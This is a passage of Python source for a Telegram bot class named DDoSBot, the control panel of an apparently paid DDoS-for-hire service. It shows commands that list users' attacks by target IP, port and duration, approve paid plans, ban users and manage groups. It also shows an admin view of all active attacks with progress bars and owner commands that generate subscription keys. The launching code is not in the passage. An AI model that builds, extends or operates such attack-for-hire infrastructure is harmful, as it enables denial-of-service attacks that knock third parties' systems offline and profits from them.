        user_id = message.from_user.id

        attacks = self.db.get_user_attacks(user_id, limit=10)

        if not attacks:
            await self.bot.send_message(chat_id, "*No attack history found.*", parse_mode="Markdown")
            return

        lines = ["*Your Last 10 Attacks*\n"]
        for a in attacks:
            target = a.get("target", "?")
            port = a.get("port", "?")
            dur = a.get("duration", "?")
            status = a.get("status", "?")
            start = a.get("start_time", "")
            if isinstance(start, datetime):
                start = start.strftime("%H:%M UTC")
            lines.append(f"`{target}:{port}` | `{dur}s` | `{status}` | `{start}`")

        await self.bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

    # ---------- Admin Commands ----------
    async def cmd_approve(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 4:
            await self.bot.send_message(chat_id, "*Usage:* `/approve <uid> <plan> <days>`", parse_mode="Markdown")
            return
        try:
            target_id = int(parts[1])
            plan = int(parts[2])
            days = int(parts[3])
        except ValueError:
            await self.bot.send_message(chat_id, "*All arguments must be numbers.*", parse_mode="Markdown")
            return

        if days <= 0:
            await self.bot.send_message(chat_id, "*Days must be greater than 0.*", parse_mode="Markdown")
            return
        if plan not in Config.PLAN_LIMITS:
            await self.bot.send_message(chat_id, f"*Invalid plan. Available: {list(Config.PLAN_LIMITS.keys())}*", parse_mode="Markdown")
            return

        valid_until = datetime.now(pytz.UTC) + timedelta(days=days)
        self.db.users.update_one(
            {"user_id": target_id},
            {
                "$set": {"plan": plan, "valid_until": valid_until},
                "$setOnInsert": {"access_count": 0},
            },
            upsert=True,
        )
        await self.bot.send_message(
            chat_id,
            f"*User Approved*\n"
            f"User: `{target_id}`\n"
            f"Plan: `{plan}`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S UTC')}`",
            parse_mode="Markdown",
        )

    async def cmd_disapprove(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/disapprove <uid>`", parse_mode="Markdown")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            await self.bot.send_message(chat_id, "*User ID must be a number.*", parse_mode="Markdown")
            return

        self.db.users.update_one(
            {"user_id": target_id},
            {"$set": {"plan": 0, "valid_until": None}},
        )
        await self.bot.send_message(chat_id, f"*User `{target_id}` has been disapproved.*", parse_mode="Markdown")

    async def cmd_ban(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/ban <uid> [reason]`", parse_mode="Markdown")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            await self.bot.send_message(chat_id, "*User ID must be a number.*", parse_mode="Markdown")
            return

        reason = " ".join(parts[2:]) if len(parts) > 2 else "No reason provided"
        self.db.ban_user(target_id, reason, user_id)
        await self.bot.send_message(chat_id, f"*User `{target_id}` has been banned.*\nReason: `{reason}`", parse_mode="Markdown")

        try:
            await self.bot.send_message(
                target_id,
                f"*You have been banned from using this bot.*\nReason: `{reason}`\nContact: {Config.OWNER_USERNAME}",
                parse_mode="Markdown",
            )
        except Exception:
            pass

    async def cmd_unban(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/unban <uid>`", parse_mode="Markdown")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            await self.bot.send_message(chat_id, "*User ID must be a number.*", parse_mode="Markdown")
            return

        self.db.unban_user(target_id)
        await self.bot.send_message(chat_id, f"*User `{target_id}` has been unbanned.*", parse_mode="Markdown")

    async def cmd_banned(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        banned_docs = list(self.db.banned.find())
        if not banned_docs:
            await self.bot.send_message(chat_id, "*No banned users.*", parse_mode="Markdown")
            return

        lines = ["*Banned Users*\n"]
        for doc in banned_docs:
            uid = doc.get("user_id", "?")
            reason = doc.get("reason", "N/A")
            lines.append(f"`{uid}` - `{reason}`")

        # Use chunking
        CHUNK = 4000
        chunk = []
        for line in lines:
            if len("\n".join(chunk + [line])) > CHUNK:
                await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")
                chunk = [line]
            else:
                chunk.append(line)
        if chunk:
            await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")

    async def cmd_users(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        docs = self.db.get_all_users(plan_gt=0)
        if not docs:
            await self.bot.send_message(chat_id, "*No approved users.*", parse_mode="Markdown")
            return

        lines = ["*Approved Users*\n"]
        for doc in docs:
            uid = doc.get("user_id", "?")
            plan = doc.get("plan", "?")
            until = doc.get("valid_until", "N/A")
            if isinstance(until, datetime):
                until = until.strftime("%Y-%m-%d")
            lines.append(f"`{uid}` - Plan `{plan}` - Until `{until}`")

        # Chunk
        CHUNK = 4000
        chunk = []
        for line in lines:
            if len("\n".join(chunk + [line])) > CHUNK:
                await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")
                chunk = [line]
            else:
                chunk.append(line)
        if chunk:
            await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")

    async def cmd_broadcast(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/broadcast <message>`", parse_mode="Markdown")
            return

        msg_text = parts[1]
        # Confirmation
        confirm = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("Yes, send", callback_data="broadcast_yes"),
            types.InlineKeyboardButton("Cancel", callback_data="broadcast_no")
        )
        sent = await self.bot.send_message(
            chat_id,
            f"*Confirm Broadcast*\n\nSend this to all users?\n\n`{msg_text[:200]}`",
            parse_mode="Markdown",
            reply_markup=confirm
        )
        # Store context for later (we'll use a temporary dict)
        self._broadcast_data = {"msg": msg_text, "sent_msg_id": sent.message_id, "chat_id": chat_id}

    # We'll handle broadcast_yes callback in _handle_callback
    async def _broadcast_execute(self, chat_id: int, msg_text: str):
        all_docs = self.db.get_all_users(plan_gt=0)
        sent = 0
        failed = 0
        for doc in all_docs:
            try:
                await self.bot.send_message(doc["user_id"], f"*Broadcast:*\n{msg_text}", parse_mode="Markdown")
                sent += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.05)
        await self.bot.send_message(chat_id, f"*Broadcast done*\nSent: `{sent}` | Failed: `{failed}`", parse_mode="Markdown")

    async def _handle_callback(self, call):
        if call.data == "plans":
            await self.cmd_plans(call.message)
        elif call.data == "help":
            await self.cmd_help(call.message)
        elif call.data == "status":
            class FakeMessage:
                def __init__(self, msg):
                    self.chat = msg.chat
                    self.from_user = msg.from_user
                    self.text = "/status"
                    self.message_id = msg.message_id
            await self.cmd_status(FakeMessage(call.message))
        elif call.data == "broadcast_yes":
            await self.bot.answer_callback_query(call.id)
            # Execute broadcast
            data = getattr(self, "_broadcast_data", None)
            if data and data["chat_id"] == call.message.chat.id:
                await self._broadcast_execute(data["chat_id"], data["msg"])
            else:
                await self.bot.edit_message_text("Broadcast cancelled or expired.", chat_id=call.message.chat.id, message_id=call.message.message_id)
        elif call.data == "broadcast_no":
            await self.bot.answer_callback_query(call.id)
            await self.bot.edit_message_text("Broadcast cancelled.", chat_id=call.message.chat.id, message_id=call.message.message_id)
        else:
            await self.bot.answer_callback_query(call.id)

    # ---------- Group Commands ----------
    async def cmd_addgroup(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/addgroup <group_id>`", parse_mode="Markdown")
            return
        try:
            group_id = int(parts[1])
        except ValueError:
            await self.bot.send_message(chat_id, "*Group ID must be a number.*", parse_mode="Markdown")
            return

        group_title = parts[2] if len(parts) > 2 else f"Group-{group_id}"
        self.db.add_group(group_id, group_title, user_id)

        if group_id not in Config.ALLOWED_GROUPS:
            Config.ALLOWED_GROUPS.append(group_id)

        await self.bot.send_message(chat_id, f"*Group added*\nID: `{group_id}`\nTitle: `{group_title}`", parse_mode="Markdown")

    async def cmd_delgroup(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/delgroup <group_id>`", parse_mode="Markdown")
            return
        try:
            group_id = int(parts[1])
        except ValueError:
            await self.bot.send_message(chat_id, "*Group ID must be a number.*", parse_mode="Markdown")
            return

        self.db.remove_group(group_id)
        Config.ALLOWED_GROUPS = [gid for gid in Config.ALLOWED_GROUPS if gid != group_id]
        await self.bot.send_message(chat_id, f"*Group `{group_id}` removed.*", parse_mode="Markdown")

    async def cmd_groups(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        groups = self.db.get_all_groups()
        if not groups:
            await self.bot.send_message(chat_id, "*No groups configured.*", parse_mode="Markdown")
            return

        lines = ["*Allowed Groups*\n"]
        for g in groups:
            lines.append(f"`{g['group_id']}` - {g.get('title', 'N/A')}")
        await self.bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

    # ---------- Admin All Status ----------
    async def cmd_allstatus(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_admin(user_id):
            await self.bot.send_message(chat_id, "*Admin only*", parse_mode="Markdown")
            return

        total_active = 0
        lines = ["*All Active Attacks*\n"]
        now = time.time()

        for uid, attacks in self.attack_manager.active_attacks.items():
            for attack in attacks:
                total_active += 1
                target = attack.get("target", "?")
                port = attack.get("port", "?")
                end = attack.get("end_time", now)
                remaining = max(0, int(end - now))
                aid = attack.get("id", "?")[:8]

                start = attack.get("start_time", end - attack.get("duration", 0))
                total = end - start
                elapsed = now - start
                percent = min(100.0, (elapsed / total) * 100.0) if total > 0 else 100.0
                bar = self.attack_manager.build_progress_bar(percent)

                lines.append(
                    f"User: `{uid}` | `{aid}`\n"
                    f"Target: `{target}:{port}` | Remaining: `{remaining}s`\n"
                    f"Progress: {bar}\n"
                )

        if total_active == 0:
            lines.append("*No active attacks.*")

        lines.append(f"\n*Total Active: `{total_active}`*")

        await self.bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

    # ---------- Owner Commands ----------
    async def cmd_genkey(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            await self.bot.send_message(chat_id, "*Owner only*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 3:
            await self.bot.send_message(chat_id, "*Usage:* `/genkey <plan> <days>`", parse_mode="Markdown")
            return
        try:
            plan = int(parts[1])
            days = int(parts[2])
        except ValueError:
            await self.bot.send_message(chat_id, "*Plan and days must be numbers.*", parse_mode="Markdown")
            return

        if plan not in Config.PLAN_LIMITS:
            await self.bot.send_message(chat_id, f"*Invalid plan. Available: {list(Config.PLAN_LIMITS.keys())}*", parse_mode="Markdown")
            return
        if days <= 0 or days > 365:
            await self.bot.send_message(chat_id, "*Days must be between 1 and 365.*", parse_mode="Markdown")
            return

        key = self.db.generate_key(plan, days, user_id)
        if not key:
            await self.bot.send_message(chat_id, "*Failed to generate key.*", parse_mode="Markdown")
            return
        await self.bot.send_message(
            chat_id,
            f"*Key Generated*\n"
            f"Key: `{key}`\n"
            f"Plan: `{plan}`\n"
            f"Days: `{days}`\n\n"
            f"Users can redeem with: `/redeem {key}`",
            parse_mode="Markdown",
        )

    async def cmd_keys(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        if not self._is_owner(user_id):
            await self.bot.send_message(chat_id, "*Owner only*", parse_mode="Markdown")
            return

        keys = list(self.db.keys.find())
        if not keys:
            await self.bot.send_message(chat_id, "*No keys generated.*", parse_mode="Markdown")
            return

        lines = ["*Generated Keys*\n"]
        for k in keys:
            key = k.get("key", "?")
            plan = k.get("plan", "?")
            days = k.get("days", "?")
            redeemed = k.get("redeemed_by")
            status = f"Redeemed by `{redeemed}`" if redeemed else "`Available`"
            lines.append(f"`{key}` - Plan `{plan}` - `{days}`d - {status}")

        # Chunk
        CHUNK = 4000
        chunk = []
        for line in lines:
            if len("\n".join(chunk + [line])) > CHUNK:
                await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")
                chunk = [line]
            else:
                chunk.append(line)
        if chunk:
            await self.bot.send_message(chat_id, "\n".join(chunk), parse_mode="Markdown")

    # ---------- Run ----------
    async def run(self) -> None:
        try:
            me = await self.bot.get_me()
            logger.info("Bot started: @%s (id=%d)", me.username, me.id)
        except Exception as exc:
            logger.warning("Could not fetch bot info: %s", exc)

        self.session = aiohttp.ClientSession()
        logger.info("Starting polling...")

        # Periodic cleanup
        async def periodic_cleanup():
            while True:
                await asyncio.sleep(Config.COOLDOWN_CLEANUP_INTERVAL)
                await self.attack_manager.cleanup(self.db)

        asyncio.create_task(periodic_cleanup())

        try:
            await self.bot.infinity_polling(timeout=60, request_timeout=60)
        finally:
            if self.session:
                await self.session.close()

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    bot_instance = DDoSBot()
    asyncio.run(bot_instance.run())